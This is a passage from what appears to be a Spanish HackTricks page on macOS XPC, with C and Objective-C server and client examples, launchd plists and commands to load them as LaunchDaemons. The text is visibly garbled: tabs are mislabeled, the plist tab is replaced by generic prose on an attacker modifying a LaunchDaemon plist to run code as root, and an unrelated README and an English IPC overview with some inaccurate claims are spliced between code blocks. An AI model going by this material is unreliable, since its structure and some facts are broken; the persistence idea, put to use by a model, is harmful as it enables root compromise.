Las aplicaciones pueden **suscribirse** a diferentes **mensajes de eventos**, lo que les permite ser **iniciadas a pedido** cuando ocurren dichos eventos. La **configuración** de estos servicios se realiza en archivos **plist de launchd**, ubicados en los **mismos directorios que los anteriores** y que contienen una clave adicional de **`LaunchEvent`**.

### Verificación del proceso de conexión XPC

Cuando un proceso intenta llamar a un método a través de una conexión XPC, el **servicio XPC debe verificar si ese proceso tiene permitido conectarse**. Aquí se presentan las formas comunes de verificar eso y las trampas comunes:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### Autorización XPC

Apple también permite que las aplicaciones **configuren algunos derechos y cómo obtenerlos** para que, si el proceso que llama los tiene, se le permita **llamar a un método** del servicio XPC:

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Ejemplo de código en C

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% endtab %}

{% tab title="xpc_server.c" %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% endtab %}

{% tab title="xyz.hacktricks.service.plist" %}

El archivo `xyz.hacktricks.service.plist` es un archivo de propiedad de Launchd que se utiliza para iniciar un servicio en macOS. Este archivo se encuentra en la ruta `/Library/LaunchDaemons/` y se ejecuta como root. 

Para aprovechar este archivo, un atacante puede modificarlo para ejecutar su propio código malicioso en el sistema. Esto se puede hacer agregando un nuevo diccionario de clave-valor en el archivo plist que especifica el comando a ejecutar y los argumentos necesarios. 

Una vez que se ha modificado el archivo plist, el atacante puede cargar el servicio utilizando el comando `launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist`. Esto iniciará el servicio malicioso y permitirá al atacante ejecutar comandos con privilegios de root en el sistema. 

Es importante tener en cuenta que para modificar este archivo, el atacante necesitará acceso de escritura a la ruta `/Library/LaunchDaemons/`, lo que generalmente requiere privilegios de root o acceso físico al sistema. 

Para evitar este tipo de ataque, se recomienda asegurarse de que los permisos de archivo sean adecuados y de que solo los usuarios autorizados tengan acceso de escritura a los archivos de Launchd. Además, se recomienda monitorear regularmente los archivos de Launchd en busca de modificaciones no autorizadas. 

{% endtab %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### Ejemplo de código ObjectiveC

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% endtab %}

{% tab title="README.md" %}
# Comunicación interproceso (IPC) en macOS

En macOS, los procesos pueden comunicarse entre sí utilizando varios mecanismos de IPC. Algunos de los mecanismos de IPC comunes en macOS son:

- **Mach IPC**: es el mecanismo de IPC subyacente en macOS. Proporciona una variedad de funciones para la comunicación entre procesos, como la creación de puertos, la creación de mensajes y la administración de colas de mensajes. Mach IPC se utiliza ampliamente en macOS para la comunicación entre procesos del sistema operativo y también se utiliza en aplicaciones de terceros.

- **XPC**: es un marco de IPC de nivel superior que se basa en Mach IPC. Proporciona una API más fácil de usar para la comunicación entre procesos y también proporciona características adicionales, como la administración de conexiones y la administración de recursos. XPC se utiliza ampliamente en macOS para la comunicación entre procesos del sistema operativo y también se utiliza en aplicaciones de terceros.

- **Distributed Objects**: es un marco de IPC de nivel superior que se basa en Mach IPC. Proporciona una API orientada a objetos para la comunicación entre procesos y también proporciona características adicionales, como la administración de conexiones y la administración de recursos. Distributed Objects se utiliza principalmente en aplicaciones de terceros.

- **Apple Events**: es un mecanismo de IPC que se utiliza para la comunicación entre aplicaciones en macOS. Proporciona una API para enviar y recibir eventos que contienen información y comandos. Apple Events se utiliza ampliamente en macOS para la automatización de aplicaciones y también se utiliza en aplicaciones de terceros.

En este directorio, se proporcionan ejemplos de código para la comunicación entre procesos utilizando Mach IPC y XPC. Los ejemplos de código incluyen:

- `mach_client.c`: un cliente Mach IPC simple que se conecta a un servidor Mach IPC y envía un mensaje.
- `mach_server.c`: un servidor Mach IPC simple que espera conexiones de clientes Mach IPC y recibe mensajes.
- `oc_xpc_client.m`: un cliente XPC simple que se conecta a un servicio XPC y envía un mensaje.
- `oc_xpc_service.m`: un servicio XPC simple que espera conexiones de clientes XPC y recibe mensajes.

## Referencias

- [Mach IPC Programming Guide](https://developer.apple.com/library/archive/documentation/General/Conceptual/ConcurrencyProgrammingGuide/InterThreadCommunication/InterThreadCommunication.html#//apple_ref/doc/uid/TP40008091-CH102-SW1)
- [XPC Services API](https://developer.apple.com/documentation/xpc)
- [Distributed Objects Programming Topics](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/)
- [Apple Events Programming Guide](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html#//apple_ref/doc/uid/TP40000983-CH208-SW1)
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
{% endtab %}

{% tab title="macOS IPC (Inter-Process Communication)" %}
# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:

* Mach ports
* Unix domain sockets
* Distributed Objects
* XPC

## Mach Ports

Mach ports are a low-level IPC mechanism used by macOS. They are used to send messages between processes and to create inter-process communication channels. Mach ports are used by many macOS system services, including launchd, the WindowServer, and the kernel.

Mach ports are identified by a port name, which is a 32-bit integer. Ports can be created, destroyed, and passed between processes. When a process creates a port, it can specify whether the port is a send right, a receive right, or both. A send right allows a process to send messages to the port, while a receive right allows a process to receive messages from the port.

Mach ports can be used to perform a variety of tasks, including:

* Sending messages between processes
* Sharing memory between processes
* Creating inter-process communication channels
* Creating synchronization primitives

Mach ports are a powerful IPC mechanism, but they are also complex and difficult to use correctly. Improper use of Mach ports can lead to security vulnerabilities, including privilege escalation and denial-of-service attacks.

## Unix Domain Sockets

Unix domain sockets are a type of IPC mechanism used by macOS and other Unix-based operating systems. They provide a mechanism for processes to communicate with each other over the local network. Unix domain sockets are similar to TCP/IP sockets, but they are implemented entirely within the operating system kernel.

Unix domain sockets are identified by a socket file, which is a special type of file that is used to represent the socket. When a process creates a socket, it can specify whether the socket is a stream socket or a datagram socket. Stream sockets provide a reliable, connection-oriented communication channel, while datagram sockets provide an unreliable, connectionless communication channel.

Unix domain sockets can be used to perform a variety of tasks, including:

* Sending messages between processes
* Sharing memory between processes
* Creating inter-process communication channels
* Creating synchronization primitives

Unix domain sockets are a simpler and more lightweight IPC mechanism than Mach ports, but they are also less powerful. They are typically used for communication between processes running on the same system.

## Distributed Objects

Distributed Objects is an IPC mechanism provided by macOS that allows objects to be passed between processes. It is based on the Objective-C language and provides a high-level, object-oriented interface to IPC.

Distributed Objects allows objects to be passed between processes using a proxy mechanism. When a process wants to use an object in another process, it creates a proxy object that represents the remote object. The proxy object can be used to call methods on the remote object, and the results are returned to the calling process.

Distributed Objects provides a number of features, including:

* Automatic serialization and deserialization of objects
* Automatic garbage collection of objects
* Support for remote method invocation
* Support for distributed notifications

Distributed Objects is a powerful IPC mechanism, but it is also complex and difficult to use correctly. Improper use of Distributed Objects can lead to security vulnerabilities, including privilege escalation and denial-of-service attacks.

## XPC

XPC is a modern IPC mechanism provided by macOS. It is designed to be more secure and easier to use than Mach ports and Distributed Objects. XPC provides a high-level, object-oriented interface to IPC.

XPC is based on a client-server model. A process that wants to provide a service creates an XPC service, which is a special type of process that runs in the background and provides the service. A process that wants to use the service creates an XPC connection to the service and uses it to communicate with the service.

XPC provides a number of features, including:

* Automatic serialization and deserialization of objects
* Automatic memory management of objects
* Support for remote method invocation
* Support for distributed notifications
* Support for sandboxing and code signing

XPC is a powerful and easy-to-use IPC mechanism that is designed to be more secure than Mach ports and Distributed Objects. It is the recommended IPC mechanism for modern macOS applications.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## Referencias

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
